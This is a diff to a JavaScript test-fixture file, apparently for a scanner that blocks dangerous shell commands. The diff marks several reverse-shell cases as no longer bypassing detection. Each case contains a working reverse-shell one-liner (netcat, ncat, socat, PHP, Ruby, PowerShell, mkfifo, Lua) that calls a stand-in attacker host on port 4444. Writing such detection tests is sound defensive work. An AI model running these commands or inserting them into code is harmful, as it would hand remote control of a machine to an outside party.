@@ -43,42 +43,42 @@ module.exports = [
   {
     id: 'revsh-nc-e',
     category: 'reverse-shell', technique: 'netcat-exec', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'netcat -e /bin/sh reverse shell — no /dev/tcp and no "| bash" literal',
     code: `require('child_process').exec('nc -e /bin/sh attacker.example 4444');`,
   },
   {
     id: 'revsh-ncat-exec',
     category: 'reverse-shell', technique: 'ncat-exec', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'ncat --exec reverse shell',
     code: `require('child_process').exec('ncat --exec "/bin/bash" attacker.example 4444');`,
   },
   {
     id: 'revsh-socat',
     category: 'reverse-shell', technique: 'socat-exec', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'socat reverse shell with a pty',
     code: `require('child_process').exec('socat TCP:attacker.example:4444 EXEC:/bin/bash,pty,stderr');`,
   },
   {
     id: 'revsh-php-fsockopen',
     category: 'reverse-shell', technique: 'php-fsockopen', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'php -r fsockopen reverse shell',
     code: `require('child_process').exec("php -r '$s=fsockopen(\\"attacker\\",4444);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");'");`,
   },
   {
     id: 'revsh-ruby-socket',
     category: 'reverse-shell', technique: 'ruby-socket', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'ruby TCPSocket reverse shell',
     code: "require('child_process').exec('ruby -rsocket -e \"c=TCPSocket.new(0,4444);loop{c.print(IO.popen(c.gets,&:read))}\"');",
   },
   {
     id: 'revsh-powershell-tcpclient',
     category: 'reverse-shell', technique: 'powershell-tcpclient', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'PowerShell TCPClient reverse shell',
     code: `require('child_process').exec('powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\\'attacker\\',4444)"');`,
   },
@@ -100,7 +100,7 @@ module.exports = [
   {
     id: 'revsh-mkfifo-backpipe',
     category: 'reverse-shell', technique: 'mkfifo-backpipe', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'mkfifo backpipe reverse shell with nc',
     code: `require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f');`,
   },
@@ -125,7 +125,7 @@ module.exports = [
   {
     id: 'revsh-lua-socket',
     category: 'reverse-shell', technique: 'lua-socket', severity: 'CRITICAL',
-    expected: 'BLOCK', knownBypass: true,
+    expected: 'BLOCK', knownBypass: false, // closed: reverse-shell tool BLOCK_REGEXES (Phase 2)
     description: 'lua socket reverse shell',
     code: `require('child_process').exec('lua -e "require(\\'socket\\'); os.execute(\\'/bin/sh\\')"');`,
   },
